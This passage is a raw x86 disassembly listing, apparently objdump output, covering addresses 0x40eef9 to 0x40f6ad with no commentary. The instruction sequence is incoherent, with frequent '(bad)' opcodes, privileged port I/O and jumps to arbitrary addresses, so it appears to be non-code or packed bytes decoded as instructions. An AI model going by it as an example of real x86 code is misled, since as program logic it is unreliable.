  40eef9:	jnp    0x40ef4a
  40eefb:	frstor [esi]
  40eefd:	xchg   ebx,eax
  40eefe:	or     ch,BYTE PTR [ecx]
  40ef00:	sbb    bl,BYTE PTR [edi+0x6fbe094a]
  40ef06:	cmp    DWORD PTR [ebp+0x36],ecx
  40ef09:	mov    ?,WORD PTR ds:0x69f224aa
  40ef0f:	ret    
  40ef10:	fidivr DWORD PTR [edx-0x795eafe1]
  40ef16:	adc    esp,eax
  40ef18:	std    
  40ef19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef1a:	test   al,0x5c
  40ef1c:	cs xchg ebp,eax
  40ef1e:	adc    esp,DWORD PTR fs:[ecx+0x3a8dad84]
  40ef25:	and    esi,ebx
  40ef27:	test   edx,esp
  40ef29:	jge    0x40ef33
  40ef2b:	into   
  40ef2c:	test   DWORD PTR [ebp+0x53670d0a],esp
  40ef32:	and    eax,0x8e87d4a2
  40ef37:	pop    ss
  40ef38:	push   es
  40ef39:	stos   DWORD PTR es:[edi],eax
  40ef3a:	fsub   st(7),st
  40ef3c:	in     eax,dx
  40ef3d:	and    al,0x97
  40ef3f:	dec    eax
  40ef40:	xor    al,0x86
  40ef42:	jnp    0x40ef1d
  40ef44:	xlat   BYTE PTR ds:[ebx]
  40ef45:	adc    BYTE PTR [esi],ch
  40ef47:	add    edi,ecx
  40ef49:	outs   dx,BYTE PTR ds:[esi]
  40ef4a:	test   ebx,ecx
  40ef4c:	pop    esi
  40ef4d:	push   edi
  40ef4e:	mov    ds:0x2c752e76,al
  40ef53:	fistp  DWORD PTR [edi+0x619c537e]
  40ef59:	scas   eax,DWORD PTR es:[edi]
  40ef5a:	test   BYTE PTR [esp+edx*4+0x59621aea],0x55
  40ef62:	inc    edx
  40ef63:	sub    al,0x53
  40ef65:	in     al,0x5e
  40ef67:	jp     0x40efa7
  40ef69:	sahf   
  40ef6a:	pushf  
  40ef6b:	hlt    
  40ef6c:	dec    ecx
  40ef6d:	cmc    
  40ef6e:	retf   
  40ef6f:	popa   
  40ef70:	or     DWORD PTR fs:[eax],edi
  40ef73:	xchg   cl,ah
  40ef75:	and    BYTE PTR [edx],ch
  40ef77:	push   ss
  40ef78:	jb     0x40efe5
  40ef7a:	jo     0x40ef9e
  40ef7c:	and    DWORD PTR [edx+ebp*2-0x4c24b4cf],0xb46b0bfb
  40ef87:	cmp    eax,0xb5238156
  40ef8c:	adc    eax,0x26ab7430
  40ef91:	dec    esp
  40ef92:	add    BYTE PTR [ebp-0x2a2fd6b5],bh
  40ef98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef99:	sbb    eax,0x4113d1b1
  40ef9e:	das    
  40ef9f:	mov    bl,0x52
  40efa1:	cmp    dh,BYTE PTR ds:0x59ded8ab
  40efa7:	daa    
  40efa8:	fwait
  40efa9:	and    DWORD PTR [ecx-0x11],esi
  40efac:	stos   DWORD PTR es:[edi],eax
  40efad:	sub    eax,0xebbf3eba
  40efb2:	mov    al,0xa5
  40efb4:	fild   DWORD PTR [esi+0x1c4697c5]
  40efba:	sbb    BYTE PTR [ebx+0x63ff1593],bh
  40efc0:	in     eax,dx
  40efc1:	jne    0x40ef7f
  40efc3:	adc    esi,edi
  40efc5:	repnz mov BYTE PTR [edx+eiz*2+0x41a09ab6],cl
  40efcd:	jbe    0x40efc7
  40efcf:	add    eax,0xd4445f1f
  40efd4:	xlat   BYTE PTR ds:[ebx]
  40efd5:	jb     0x40efa2
  40efd7:	daa    
  40efd8:	push   edx
  40efd9:	add    dh,BYTE PTR [edi+0x61ae6c10]
  40efdf:	adc    DWORD PTR [eax],0x1b
  40efe2:	iret   
  40efe3:	and    BYTE PTR [esi+0x8fc4f04],dh
  40efe9:	enter  0x3d05,0xb
  40efed:	pop    esp
  40efee:	pop    ss
  40efef:	(bad)  
  40eff0:	sub    ebp,DWORD PTR [ecx]
  40eff2:	dec    esp
  40eff3:	retf   
  40eff4:	ins    BYTE PTR es:[edi],dx
  40eff5:	jno    0x40ef8a
  40eff7:	fdiv   DWORD PTR [ebx+0x66b89ec]
  40effd:	repnz sbb eax,0x45e05311
  40f003:	xchg   edx,eax
  40f004:	sahf   
  40f005:	xchg   ebp,eax
  40f006:	iret   
  40f007:	je     0x40f04d
  40f009:	test   al,0xc2
  40f00c:	or     esp,esi
  40f00e:	imul   edx,DWORD PTR [ebx+eax*8+0xc62acf0],0x4f0a3d13
  40f019:	in     eax,dx
  40f01a:	dec    edx
  40f01b:	mov    al,ds:0x420673ac
  40f020:	cld    
  40f021:	pop    ebp
  40f022:	aas    
  40f023:	mov    esp,0x1279fc87
  40f028:	push   ebp
  40f029:	sbb    dl,dl
  40f02b:	sbb    BYTE PTR [ebp+0x11],ch
  40f02e:	mov    ah,0xa7
  40f030:	pop    esi
  40f031:	add    al,0x60
  40f033:	retf   0x4096
  40f036:	xor    bl,BYTE PTR ds:0x81e906fe
  40f03c:	rcr    BYTE PTR [ebx-0x54dc655a],1
  40f042:	out    dx,al
  40f043:	icebp  
  40f044:	ret    0x6793
  40f047:	xchg   BYTE PTR [ebx-0x46259c79],ch
  40f04d:	mov    bh,0x56
  40f04f:	dec    ebp
  40f050:	in     eax,dx
  40f051:	xor    eax,0x50b8f525
  40f056:	adc    edi,DWORD PTR [ebp+0xa3be5ad]
  40f05c:	sub    eax,0x6d21e75c
  40f061:	retf   0x6129
  40f064:	mov    esi,0x48748696
  40f069:	inc    esp
  40f06a:	fneni(8087 only) 
  40f06c:	sbb    BYTE PTR [edi],bl
  40f06e:	xchg   DWORD PTR [edx-0x1],esp
  40f071:	mov    edx,0x42963d8
  40f076:	mov    edx,0x4a2434fc
  40f07b:	and    edi,ebx
  40f07d:	(bad)  
  40f07e:	out    dx,eax
  40f07f:	push   ebx
  40f080:	arpl   WORD PTR [edx],sp
  40f082:	jge    0x40f087
  40f084:	lods   eax,DWORD PTR ds:[esi]
  40f085:	cmp    ecx,eax
  40f087:	or     BYTE PTR [edi],dh
  40f089:	(bad)  
  40f08a:	scas   al,BYTE PTR es:[edi]
  40f08b:	es inc eax
  40f08d:	push   edi
  40f08e:	and    esp,eax
  40f090:	jmp    0xc55d:0x29d7b113
  40f097:	(bad)  
  40f098:	pop    esi
  40f099:	rol    BYTE PTR [ecx-0x623a98ba],cl
  40f09f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0a0:	ss retf 0x943d
  40f0a4:	and    eax,0x9a2fd415
  40f0a9:	inc    ebp
  40f0aa:	lock jns 0x40f116
  40f0ad:	es inc ebp
  40f0af:	packssdw mm1,QWORD PTR ds:0x43dc6d0e
  40f0b6:	(bad)  
  40f0b7:	stc    
  40f0b8:	sti    
  40f0b9:	test   eax,0x8ffab78d
  40f0be:	mov    WORD PTR [edx-0x48956583],cs
  40f0c4:	repz or eax,0xed07b3eb
  40f0ca:	loopne 0x40f12d
  40f0cc:	(bad)  
  40f0cd:	xor    ebp,esi
  40f0cf:	adc    eax,0x48823a29
  40f0d4:	mov    edx,0xbba9c714
  40f0d9:	sub    al,BYTE PTR [ebp-0xa0e42f6]
  40f0df:	push   eax
  40f0e0:	sbb    al,0xe8
  40f0e2:	jns    0x40f10b
  40f0e4:	stos   BYTE PTR es:[edi],al
  40f0e5:	mov    dl,0x2
  40f0e7:	int3   
  40f0e8:	ds aam 0xc5
  40f0eb:	inc    esp
  40f0ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0ed:	xor    BYTE PTR [eax+edi*2+0x73789416],bl
  40f0f4:	pop    esp
  40f0f5:	add    dl,ah
  40f0f7:	jae    0x40f085
  40f0f9:	sub    DWORD PTR [esp+esi*4],esp
  40f0fc:	repnz push edx
  40f0fe:	push   0x4bd15612
  40f103:	dec    eax
  40f104:	inc    DWORD PTR ds:0x189292dc
  40f10a:	push   ebp
  40f10b:	jle    0x40f0af
  40f10d:	ss push ds
  40f10f:	psubsw mm6,QWORD PTR [edi]
  40f112:	retf   
  40f113:	daa    
  40f114:	sbb    BYTE PTR [edx],bl
  40f116:	fcom   DWORD PTR [ecx+0x2b5f0dcd]
  40f11c:	cmp    bh,BYTE PTR [eax-0x7f82b0d6]
  40f122:	sbb    edi,0xffffff8f
  40f125:	xchg   BYTE PTR gs:[ecx-0x94de700],ch
  40f12c:	retf   0x46fc
  40f12f:	mov    dl,0xea
  40f131:	mov    ds:0x8dcff707,eax
  40f136:	(bad)  
  40f137:	push   ds
  40f138:	addr16 int3 
  40f13a:	dec    ebp
  40f13b:	rcl    esi,cl
  40f13d:	jae    0x40f17f
  40f13f:	adc    al,0x35
  40f141:	sub    al,0xfb
  40f143:	std    
  40f144:	and    al,0x5c
  40f146:	push   ds
  40f147:	ja     0x40f16c
  40f149:	sti    
  40f14a:	pushf  
  40f14b:	pop    edx
  40f14c:	outs   dx,DWORD PTR ds:[esi]
  40f14d:	sbb    eax,0x6f5b78f3
  40f152:	push   0xa1ea6757
  40f157:	das    
  40f158:	push   ss
  40f159:	std    
  40f15a:	sbb    ecx,ebp
  40f15c:	push   eax
  40f15d:	xchg   esp,eax
  40f15e:	push   0x2a3b6eae
  40f163:	ret    
  40f164:	(bad)  
  40f166:	jae    0x40f0e8
  40f168:	jb     0x40f1aa
  40f16a:	add    al,0x22
  40f16c:	jecxz  0x40f1b2
  40f16e:	xchg   ebx,eax
  40f16f:	sub    al,0xd7
  40f171:	cdq    
  40f172:	add    ch,bl
  40f174:	shr    DWORD PTR [ebp+0x6175235e],cl
  40f17a:	adc    dl,BYTE PTR [eax-0x46e1a403]
  40f180:	inc    edx
  40f181:	in     eax,dx
  40f182:	sbb    ch,BYTE PTR [edi-0x62b085a7]
  40f188:	cli    
  40f189:	je     0x40f139
  40f18b:	cs jle 0x40f1ea
  40f18e:	xchg   esi,eax
  40f18f:	xchg   ecx,eax
  40f190:	inc    esp
  40f191:	mov    esi,cs
  40f193:	aaa    
  40f194:	inc    esi
  40f195:	cmp    BYTE PTR [edi],bl
  40f197:	es sub eax,ebp
  40f19a:	out    dx,eax
  40f19b:	push   es
  40f19c:	ret    
  40f19d:	ja     0x40f218
  40f19f:	dec    edx
  40f1a0:	mov    WORD PTR [ebx],?
  40f1a2:	jmp    0xf6291d5b
  40f1a7:	lds    esi,FWORD PTR [esi]
  40f1a9:	ins    DWORD PTR es:[edi],dx
  40f1aa:	mov    al,ds:0x8d56b322
  40f1af:	nop
  40f1b0:	cmp    DWORD PTR [edx-0x12da6e9b],ebx
  40f1b6:	push   ds
  40f1b7:	cmp    edi,DWORD PTR [edi-0x166eba84]
  40f1bd:	mov    ebx,0x636a346
  40f1c2:	mov    cl,0xdc
  40f1c4:	add    edi,DWORD PTR [edx-0x1]
  40f1c7:	(bad)  
  40f1c8:	or     al,0x7e
  40f1ca:	pushf  
  40f1cb:	pop    esi
  40f1cc:	mov    bh,dh
  40f1ce:	sbb    dh,cl
  40f1d0:	les    ebx,FWORD PTR [eax-0x1e]
  40f1d3:	in     eax,0xe3
  40f1d5:	adc    esi,0x27
  40f1d8:	xchg   esi,eax
  40f1d9:	leave  
  40f1da:	xchg   ebp,eax
  40f1db:	repz cwde 
  40f1dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1de:	mul    ecx
  40f1e0:	cs call 0x94186ce
  40f1e6:	adc    DWORD PTR [esi+0xdb4ae66],0xbf7740d6
  40f1f0:	shr    DWORD PTR [esp+ebp*2+0x32],0xe8
  40f1f5:	retf   
  40f1f6:	push   esp
  40f1f7:	leave  
  40f1f8:	retf   0xce6a
  40f1fb:	test   eax,0xbf22d71d
  40f200:	mov    ebp,0xb679cbf0
  40f205:	sub    BYTE PTR fs:[esi-0x36f9db5c],al
  40f20c:	mov    dl,0xc7
  40f20e:	mov    esi,DWORD PTR [ebp+0x52]
  40f211:	scas   al,BYTE PTR es:[edi]
  40f212:	sub    ecx,edi
  40f214:	xchg   dh,bl
  40f216:	ins    DWORD PTR es:[edi],dx
  40f217:	lods   eax,DWORD PTR ds:[esi]
  40f218:	enter  0x3feb,0x65
  40f21c:	call   0xdd58e543
  40f221:	inc    edi
  40f222:	mov    dh,0x54
  40f224:	cwde   
  40f225:	jmp    0xe17d70ee
  40f22a:	or     DWORD PTR ds:0xfb85bf3e,esp
  40f230:	mov    ebx,0x1757399
  40f235:	xor    eax,0xd87ea75c
  40f23a:	adc    ebx,DWORD PTR [ecx+0x7bb19297]
  40f240:	leave  
  40f241:	pop    es
  40f242:	hlt    
  40f243:	pop    ecx
  40f244:	outs   dx,BYTE PTR ds:[esi]
  40f245:	or     DWORD PTR [esi],esi
  40f247:	pop    ds
  40f248:	imul   esi,DWORD PTR ds:0x87a7cc07,0xffffffd4
  40f24f:	mov    esi,gs
  40f251:	pop    ecx
  40f252:	xchg   edi,eax
  40f253:	xchg   esp,eax
  40f254:	or     bh,BYTE PTR [ebx+eax*8]
  40f257:	mov    esi,0xb9927d6e
  40f25c:	sbb    al,BYTE PTR [eax-0x4cb8e5da]
  40f262:	adc    BYTE PTR [ecx+0x6e],0x6
  40f266:	xor    BYTE PTR [ebx-0x2b],0x15
  40f26a:	jmp    0x40f2e7
  40f26c:	shl    DWORD PTR [esp+eiz*4+0x1f],cl
  40f270:	fwait
  40f271:	adc    BYTE PTR ds:0xd90b9863,0xcc
  40f278:	rcr    BYTE PTR [ebp-0xa93f8fe],1
  40f27e:	push   cs
  40f27f:	lods   eax,DWORD PTR ds:[esi]
  40f280:	lahf   
  40f281:	mov    ebx,0xcdf871da
  40f286:	popa   
  40f287:	xchg   ecx,eax
  40f288:	push   edi
  40f289:	jge    0x40f298
  40f28b:	call   0xf0d7dbbc
  40f290:	stc    
  40f291:	shl    BYTE PTR [edx-0x1d],1
  40f294:	cmp    eax,0xb5b2fed
  40f299:	ins    BYTE PTR es:[edi],dx
  40f29a:	dec    esp
  40f29b:	outs   dx,DWORD PTR ds:[esi]
  40f29c:	pushf  
  40f29d:	std    
  40f29e:	call   0xebf325cc
  40f2a3:	rcr    bh,1
  40f2a5:	(bad)
  40f2a9:	push   es
  40f2aa:	push   esp
  40f2ab:	dec    ebp
  40f2ac:	mov    bh,0xd3
  40f2ae:	pop    ecx
  40f2af:	sahf   
  40f2b0:	inc    edi
  40f2b1:	mov    esi,0x4ae616bd
  40f2b6:	scas   eax,DWORD PTR es:[edi]
  40f2b7:	in     al,dx
  40f2b8:	int    0x3c
  40f2ba:	xchg   esi,eax
  40f2bb:	mov    ds:0x1c9b6263,al
  40f2c0:	mov    edx,0x9ecd8a17
  40f2c5:	je     0x40f2b1
  40f2c7:	sbb    al,0xef
  40f2c9:	cwde   
  40f2ca:	ds cli 
  40f2cc:	ss push ss
  40f2ce:	adc    BYTE PTR [edi],bh
  40f2d0:	push   cs
  40f2d1:	sbb    DWORD PTR ss:[edi-0x7ffd405],eax
  40f2d8:	add    al,0x28
  40f2da:	mov    esi,0xe6d23ce4
  40f2df:	(bad)  
  40f2e0:	pusha  
  40f2e1:	cld    
  40f2e2:	mov    ebx,0xbb7c4e73
  40f2e7:	inc    esp
  40f2e8:	in     al,0x78
  40f2ea:	test   DWORD PTR [eax],ebx
  40f2ec:	or     al,0xbc
  40f2ee:	adc    esp,DWORD PTR [ebx+0x71624d7b]
  40f2f4:	inc    edx
  40f2f5:	ja     0x40f287
  40f2f7:	and    BYTE PTR [esi+eax*1+0x3],ch
  40f2fb:	push   es
  40f2fc:	mov    edx,ebp
  40f2fe:	adc    bh,BYTE PTR [ecx]
  40f300:	enter  0x112,0xb1
  40f304:	ds ja  0x40f297
  40f307:	and    ecx,DWORD PTR [ecx-0x6]
  40f30a:	mov    edi,0xf12daa06
  40f30f:	les    eax,FWORD PTR [ecx]
  40f311:	inc    ebx
  40f312:	mov    BYTE PTR [ebp+0x1f],al
  40f315:	fcmovu st,st(7)
  40f317:	cs jmp 0x40f2af
  40f31a:	icebp  
  40f31b:	mov    ebp,0xdfdb3e86
  40f320:	dec    esp
  40f321:	and    al,0xe7
  40f323:	jle    0x40f383
  40f325:	jne    0x40f367
  40f327:	xor    dl,BYTE PTR [edi+0x9]
  40f32a:	or     dh,BYTE PTR [ebp+0x38]
  40f32d:	pop    edi
  40f32e:	out    dx,al
  40f32f:	sbb    DWORD PTR [eax-0xf],esp
  40f332:	mov    al,0x72
  40f334:	add    eax,0x15ce0614
  40f339:	xor    eax,0x630b61b
  40f33e:	dec    edx
  40f33f:	lods   al,BYTE PTR ds:[esi]
  40f341:	not    DWORD PTR [esi]
  40f343:	cmp    bl,ah
  40f345:	mov    ch,dh
  40f347:	jl     0x40f363
  40f349:	inc    eax
  40f34a:	les    ebp,FWORD PTR [ecx+0x4d]
  40f34d:	lds    esp,FWORD PTR [ebx]
  40f34f:	jecxz  0x40f3ad
  40f351:	(bad)  
  40f352:	mov    al,ds:0xf9a6a9ab
  40f357:	sub    esp,DWORD PTR [esi+0x8]
  40f35a:	mov    esi,0x61fc8ae8
  40f35f:	shl    DWORD PTR [edi],0x12
  40f362:	nop
  40f363:	retf   
  40f364:	inc    ebx
  40f365:	jmp    0xaddeb877
  40f36a:	cmp    dh,BYTE PTR [eax]
  40f36c:	cli    
  40f36d:	shr    bl,1
  40f36f:	bound  eax,QWORD PTR [ecx+0x32]
  40f372:	daa    
  40f373:	inc    edi
  40f374:	shl    BYTE PTR [ecx-0x6a],1
  40f377:	mov    edi,0x6de46d2f
  40f37c:	xor    edx,DWORD PTR ds:0xe79a6b9f
  40f382:	fsubr  st,st(3)
  40f384:	enter  0x6639,0x0
  40f388:	(bad)  
  40f389:	call   0xd93217a1
  40f38e:	inc    esp
  40f38f:	ja     0x40f3f9
  40f391:	dec    edi
  40f392:	push   edi
  40f393:	(bad)  
  40f394:	mov    edi,0x929f9bb6
  40f399:	mov    cl,0xeb
  40f39b:	lahf   
  40f39c:	popa   
  40f39d:	(bad)  
  40f39e:	mov    edx,0xb9e6b700
  40f3a3:	or     eax,0x45fc5611
  40f3a8:	dec    esp
  40f3a9:	in     eax,0x68
  40f3ab:	test   BYTE PTR [ecx+eiz*4+0x7990118c],ah
  40f3b2:	fs mov cl,bh
  40f3b5:	push   ds
  40f3b6:	push   0x98fd2f71
  40f3bb:	cmp    ah,BYTE PTR [eax-0x58]
  40f3be:	push   0xf4d69c1c
  40f3c3:	jb     0x40f36e
  40f3c5:	out    0x74,al
  40f3c7:	lea    ecx,[ecx+0x36]
  40f3ca:	mov    dl,0xf6
  40f3cc:	fild   QWORD PTR [eax+0x11]
  40f3cf:	popa   
  40f3d0:	outs   dx,DWORD PTR ds:[esi]
  40f3d1:	in     al,0x8e
  40f3d3:	xor    dl,BYTE PTR [ecx+0x68014c5f]
  40f3d9:	cmp    al,0x4c
  40f3db:	push   esi
  40f3dc:	mov    ds:0x11925175,al
  40f3e1:	sbb    BYTE PTR [edx],al
  40f3e3:	xor    DWORD PTR [eax],eax
  40f3e5:	or     bh,BYTE PTR [ebx+0x19f4ed29]
  40f3eb:	mov    al,0xc
  40f3ed:	cwde   
  40f3ee:	popf   
  40f3ef:	inc    eax
  40f3f0:	int    0xa2
  40f3f2:	push   esp
  40f3f3:	xchg   esi,eax
  40f3f4:	jns    0x40f451
  40f3f6:	mov    ds:0x824020c2,al
  40f3fb:	xor    BYTE PTR [ecx+0x20],ch
  40f3fe:	imul   ebx,DWORD PTR [ebp+0x44],0xffffff88
  40f402:	dec    edi
  40f403:	pop    esp
  40f404:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f405:	bound  eax,QWORD PTR [ecx-0x4b]
  40f408:	in     eax,dx
  40f409:	sbb    al,0xe8
  40f40b:	(bad)  
  40f40d:	pop    ebp
  40f40e:	imul   ecx,esi,0x17
  40f411:	mov    ebp,0x34265c21
  40f416:	sbb    bh,al
  40f418:	adc    edx,DWORD PTR [ecx+0x1afdc506]
  40f41e:	jmp    0xce71a836
  40f423:	outs   dx,DWORD PTR ds:[esi]
  40f424:	and    BYTE PTR [esi+0x7f],bh
  40f427:	push   ecx
  40f428:	xor    eax,0x80352a14
  40f42d:	mov    eax,DWORD PTR [ecx]
  40f42f:	test   BYTE PTR [ebx+0x195009e5],0x3
  40f436:	cmp    eax,0x91d1c7a9
  40f43b:	cmp    al,BYTE PTR [esi+0x5b]
  40f43e:	bound  esi,QWORD PTR [eax+0x6499a491]
  40f444:	sub    BYTE PTR [ebx],0x27
  40f447:	cmp    esp,DWORD PTR [eax+0x38203748]
  40f44d:	push   eax
  40f44e:	or     eax,0x8b7bb67f
  40f453:	pop    ecx
  40f454:	xchg   edx,eax
  40f455:	and    BYTE PTR [ecx+eiz*1-0x3585df02],dl
  40f45c:	ret    0x3eea
  40f45f:	pop    ds
  40f460:	repnz cmp eax,0x4a195c4b
  40f466:	loop   0x40f4e7
  40f468:	aaa    
  40f469:	jl     0x40f405
  40f46b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f46c:	pushf  
  40f46d:	out    0xe7,al
  40f46f:	int3   
  40f470:	xor    bl,BYTE PTR [edx]
  40f472:	mov    bh,0x3d
  40f474:	mov    ch,0xf6
  40f476:	daa    
  40f477:	pop    edi
  40f478:	fild   WORD PTR [edi]
  40f47a:	aam    0x25
  40f47c:	cmp    eax,0x6854dab1
  40f481:	int    0x34
  40f483:	mov    ebx,0xa2d7526b
  40f488:	call   0x5b086d14
  40f48d:	in     al,dx
  40f48e:	jno    0x40f4d7
  40f490:	pop    esi
  40f491:	xchg   ebp,eax
  40f492:	mov    ecx,0xd7ce7740
  40f497:	dec    ecx
  40f498:	and    ebx,ebp
  40f49a:	adc    DWORD PTR [ebp-0x3adb4591],eax
  40f4a0:	leave  
  40f4a1:	and    eax,0x32d38e3c
  40f4a6:	jecxz  0x40f524
  40f4a8:	adc    eax,0x7824abf2
  40f4ad:	ins    DWORD PTR es:[edi],dx
  40f4ae:	imul   edx,DWORD PTR ds:0x962f2afa,0xffffff8b
  40f4b5:	mov    dl,0x1
  40f4b7:	pop    ebp
  40f4b8:	sahf   
  40f4b9:	jb     0x40f441
  40f4bb:	sbb    al,0x36
  40f4bd:	jecxz  0x40f505
  40f4bf:	push   esp
  40f4c0:	add    esi,DWORD PTR [edi-0x6571b70a]
  40f4c6:	pop    ecx
  40f4c7:	mov    ah,0xf8
  40f4c9:	push   cs
  40f4ca:	cmp    al,0x69
  40f4cc:	pop    ebp
  40f4cd:	nop
  40f4ce:	mov    esp,0x2a540232
  40f4d3:	(bad)  
  40f4d4:	pop    ebx
  40f4d5:	add    DWORD PTR [ebx+0x3],ebp
  40f4d8:	stos   DWORD PTR es:[edi],eax
  40f4d9:	jmp    0x66b8:0x9a05db38
  40f4e0:	xor    ecx,DWORD PTR [ebp-0x2ababbd9]
  40f4e6:	lahf   
  40f4e7:	mov    esi,0x9a53fb57
  40f4ec:	imul   edx,DWORD PTR [ecx],0x74
  40f4ef:	add    ebx,DWORD PTR [edx+0x73]
  40f4f2:	xor    BYTE PTR [ecx-0x7b5d5062],ch
  40f4f8:	popf   
  40f4f9:	pop    edi
  40f4fa:	cmp    al,0x26
  40f4fc:	pusha  
  40f4fd:	xor    BYTE PTR [ebx],bl
  40f4ff:	add    al,0x2b
  40f501:	jg     0x40f515
  40f503:	test   al,0xd0
  40f505:	mov    dl,0xb1
  40f507:	pop    eax
  40f508:	mov    dh,BYTE PTR fs:[edi-0x7f]
  40f50c:	(bad)  
  40f50d:	pop    ecx
  40f50e:	push   ebx
  40f50f:	icebp  
  40f510:	mov    bh,0x49
  40f512:	ins    DWORD PTR es:[edi],dx
  40f513:	pop    ds
  40f514:	ret    0x348f
  40f517:	cmp    bl,BYTE PTR [ecx]
  40f519:	out    dx,al
  40f51a:	call   0xf4af:0xfba5ef0d
  40f521:	sub    BYTE PTR [ecx+ebx*8-0x46],al
  40f525:	fcmovb st,st(3)
  40f527:	adc    BYTE PTR [edi-0x3dfa218a],bh
  40f52d:	xlat   BYTE PTR ds:[ebx]
  40f52e:	mov    edx,0xb5655444
  40f533:	not    bh
  40f535:	and    al,0xe5
  40f537:	push   ebx
  40f538:	imul   BYTE PTR [ecx+0x0]
  40f53b:	jle    0x40f531
  40f53d:	lods   al,BYTE PTR ds:[esi]
  40f53e:	jo     0x40f4ef
  40f540:	imul   ecx,DWORD PTR [edx+0xf13ace0],0x2b
  40f547:	sti    
  40f548:	dec    ecx
  40f549:	mov    bl,0x88
  40f54b:	bnd ret 0xe3bb
  40f54f:	cmp    ah,BYTE PTR [ecx]
  40f551:	dec    ebx
  40f552:	push   esp
  40f553:	sbb    dl,BYTE PTR [eax+0x41657ea]
  40f559:	clc    
  40f55a:	xchg   edi,eax
  40f55b:	mov    bh,ch
  40f55d:	xor    BYTE PTR [ebx],al
  40f55f:	jl     0x40f5a8
  40f561:	mov    eax,0xdf7d522b
  40f566:	cmp    ah,ch
  40f568:	shr    DWORD PTR [edi],1
  40f56a:	icebp  
  40f56b:	mov    dh,0x6
  40f56d:	mov    ds:0x1f4184bc,eax
  40f572:	sbb    ah,BYTE PTR [esi-0x47ecd41d]
  40f578:	push   ebp
  40f579:	das    
  40f57a:	xor    ch,ah
  40f57c:	je     0x40f5e9
  40f57e:	dec    BYTE PTR [ebp+0x3704344b]
  40f584:	cs iret 
  40f586:	xchg   ebp,eax
  40f587:	icebp  
  40f588:	enter  0xcc04,0x2d
  40f58c:	mov    bl,0x7f
  40f58e:	cmp    eax,0x850b5b4f
  40f593:	cld    
  40f594:	nop
  40f595:	pop    edi
  40f596:	xor    BYTE PTR [edi+0x6290bcd4],dl
  40f59c:	push   es
  40f59d:	lea    esp,[ecx-0x7]
  40f5a0:	sub    bl,BYTE PTR [eax+ebp*8]
  40f5a3:	(bad)  
  40f5a4:	cld    
  40f5a5:	daa    
  40f5a6:	mov    dh,0x6e
  40f5a8:	repz popf 
  40f5aa:	dec    edx
  40f5ab:	rcr    DWORD PTR ds:0xc20e9f4d,0x39
  40f5b2:	mov    dl,0x33
  40f5b4:	out    0x5e,al
  40f5b6:	and    eax,0xd811435
  40f5bb:	jecxz  0x40f5f6
  40f5bd:	mov    ds:0xea08c8bd,eax
  40f5c2:	mov    WORD PTR [eax-0x4e06d556],?
  40f5c8:	pop    ecx
  40f5c9:	push   ds
  40f5ca:	hlt    
  40f5cb:	inc    edi
  40f5cc:	pop    DWORD PTR [edi-0x68aaaa98]
  40f5d2:	xchg   ecx,eax
  40f5d3:	inc    ebp
  40f5d4:	popa   
  40f5d5:	gs dec edx
  40f5d7:	stos   DWORD PTR es:[edi],eax
  40f5d8:	out    0x41,al
  40f5da:	stc    
  40f5db:	xor    DWORD PTR [ecx],edi
  40f5dd:	mov    BYTE PTR [esi-0x4f4207c],ah
  40f5e3:	(bad)  
  40f5e4:	lea    ebp,[edx-0x19c9c1bb]
  40f5ea:	and    eax,0xff60ac8b
  40f5ef:	pop    ebp
  40f5f0:	loope  0x40f5ff
  40f5f2:	hlt    
  40f5f3:	std    
  40f5f4:	inc    esp
  40f5f5:	je     0x40f580
  40f5f7:	sbb    eax,0x659bb861
  40f5fc:	fiadd  WORD PTR [edi]
  40f5fe:	push   0x158164ec
  40f603:	arpl   ax,cx
  40f605:	es xchg esi,eax
  40f607:	cmp    al,0xe9
  40f609:	inc    ebx
  40f60a:	jmp    0x9b67f722
  40f60f:	cmp    DWORD PTR [ecx+0x53],0x37c88dba
  40f616:	in     eax,dx
  40f617:	stc    
  40f618:	jnp    0x40f5dd
  40f61a:	ror    dl,0x1d
  40f61d:	shl    ecx,1
  40f61f:	mov    cl,0xc8
  40f621:	jg     0x40f617
  40f623:	pop    eax
  40f624:	xchg   ebx,eax
  40f625:	sbb    eax,esp
  40f627:	rol    esp,cl
  40f629:	push   ss
  40f62a:	mov    al,ds:0x942c7412
  40f62f:	push   esp
  40f630:	push   edi
  40f631:	ja     0x40f673
  40f633:	out    0xf9,al
  40f635:	push   esi
  40f636:	rcl    DWORD PTR [edi],1
  40f638:	nop
  40f639:	xchg   ebp,eax
  40f63a:	imul   ebx,DWORD PTR [esi+edi*2],0xffffffb4
  40f63e:	rcl    DWORD PTR ds:0x190afffd,1
  40f644:	and    dl,al
  40f646:	call   DWORD PTR [eax]
  40f648:	pusha  
  40f649:	fisub  DWORD PTR [esi]
  40f64b:	out    0xd8,al
  40f64d:	or     BYTE PTR [ebx],0x5f
  40f650:	mov    WORD PTR [esi],ss
  40f652:	jno    0x40f5e2
  40f654:	push   ds
  40f655:	sub    edi,DWORD PTR [ebx-0x90789f]
  40f65b:	fldcw  WORD PTR [ecx+eiz*2-0x43]
  40f65f:	sbb    bh,dh
  40f661:	fldcw  WORD PTR [ecx+0x43]
  40f664:	cmp    eax,0xc52f66a1
  40f669:	out    dx,al
  40f66a:	lds    ebp,FWORD PTR [esi+0x2d3bd7f2]
  40f670:	xchg   ecx,eax
  40f671:	jns    0x40f6e3
  40f673:	mov    BYTE PTR [eax-0x22250e48],al
  40f679:	and    esp,eax
  40f67b:	jne    0x40f62a
  40f67d:	pop    edi
  40f67e:	popa   
  40f67f:	and    eax,0x5e8f00a
  40f684:	fs push ecx
  40f686:	sbb    DWORD PTR [edi-0x2025fec8],esp
  40f68c:	or     al,0x42
  40f68e:	dec    edi
  40f68f:	fisub  WORD PTR [ecx]
  40f691:	test   al,0xa0
  40f693:	sahf   
  40f694:	push   edi
  40f695:	popa   
  40f696:	pop    edi
  40f697:	push   esp
  40f698:	adc    esi,DWORD PTR [ecx+esi*4+0x2a5e2f9f]
  40f69f:	lods   eax,DWORD PTR ds:[esi]
  40f6a0:	(bad)  
  40f6a1:	lahf   
  40f6a2:	inc    ecx
  40f6a3:	adc    ebx,0xbdac646c
  40f6a9:	cmp    al,0x89
  40f6ab:	jl     0x40f690
  40f6ad:	push   esi
